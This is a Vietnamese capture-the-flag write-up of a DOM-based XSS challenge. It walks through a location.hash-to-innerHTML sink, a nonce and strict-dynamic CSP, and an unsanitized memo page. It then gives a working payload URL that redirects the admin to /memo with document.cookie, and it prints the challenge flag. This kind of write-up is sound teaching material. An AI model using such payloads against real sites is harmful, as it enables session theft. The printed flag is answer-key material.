# Writeup `DOM XXS`
## Solution
### 1. Lỗ hổng `DOM-XSS` do gán `location.hash` vào `innerHTML`
Phần client JS trong trang `/vuln`:
```js
window.addEventListener("load", function() {
  var name_elem = document.getElementById("name");
  name_elem.innerHTML = location.hash.slice(1) + " is my name!";
});
```
- location.hash là phần fragment URL sau dấu #, có thể do attacker kiểm soát.

- Gán trực tiếp vào innerHTML sẽ tạo ra khả năng chèn script và thực thi mã độc (DOM-based XSS).

### 2. Server trả CSP header với `nonce` và `strict-dynamic`

```python
@app.after_request
def set_csp_header(response):
    nonce = generate_nonce()
    csp = (
        "default-src 'self'; "
        "img-src https://dreamhack.io; "
        "style-src 'self' 'unsafe-inline'; "
        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic';"
    )
    response.headers['Content-Security-Policy'] = csp
    response.set_cookie('csp-nonce', nonce)
    return response

```
- CSP hạn chế nguồn script chỉ cho phép:

  - script từ chính domain ('self'),

  - script có nonce hợp lệ,

    và cho phép mở rộng dựa trên strict-dynamic.

- Mục đích ngăn chặn inline script không có nonce chạy, nhưng trong bài này payload vẫn bypass được.
 ### 3. Trang `/memo` hiển thị param `memo` không sanitize
 ```python
 @app.route('/memo')
def memo():
    memo_param = request.args.get('memo', '')
    return f'''
    <html><body>
      <h2>Memo Page</h2>
      <p>Memo: {memo_param}</p>
    </body></html>
    '''
 ```
 
 
 
- Khi payload redirect admin tới /memo?memo= chứa cookie, trang này sẽ hiển thị cookie đó.

- Đây là bước cuối để attacker lấy được cookie admin và flag.

### 4. Payload `DOM-XSS` chèn vào phần `#` của URL
```html
<script id="name"></script>location='/memo?memo='+document.cookie//
```
- Phần location.hash.slice(1) sẽ lấy payload này rồi gán vào innerHTML.

- <script id="name"></script> là thẻ script rỗng được chèn.

- Phần location=... là đoạn mã JavaScript chạy ngay sau, redirect admin sang trang /memo với cookie hiện tại.

- // dùng để comment phần còn lại tránh lỗi cú pháp.

### 5. URL payload hoàn chỉnh
```php-template
http://127.0.0.1:8000/vuln?param=<script id="name"></script>#location='/memo?memo='+document.cookie//
```
- param dùng để chèn ảnh (không ảnh hưởng payload).

- Payload nằm sau dấu # được JS client xử lý, kích hoạt DOM-XSS, đánh cắp cookie admin.

Sau đó quay trở lại `/memo` lấy flag
### Ra được flag là: `Flag=DH{f246f75f094da605e087bb5c0916c0d2}`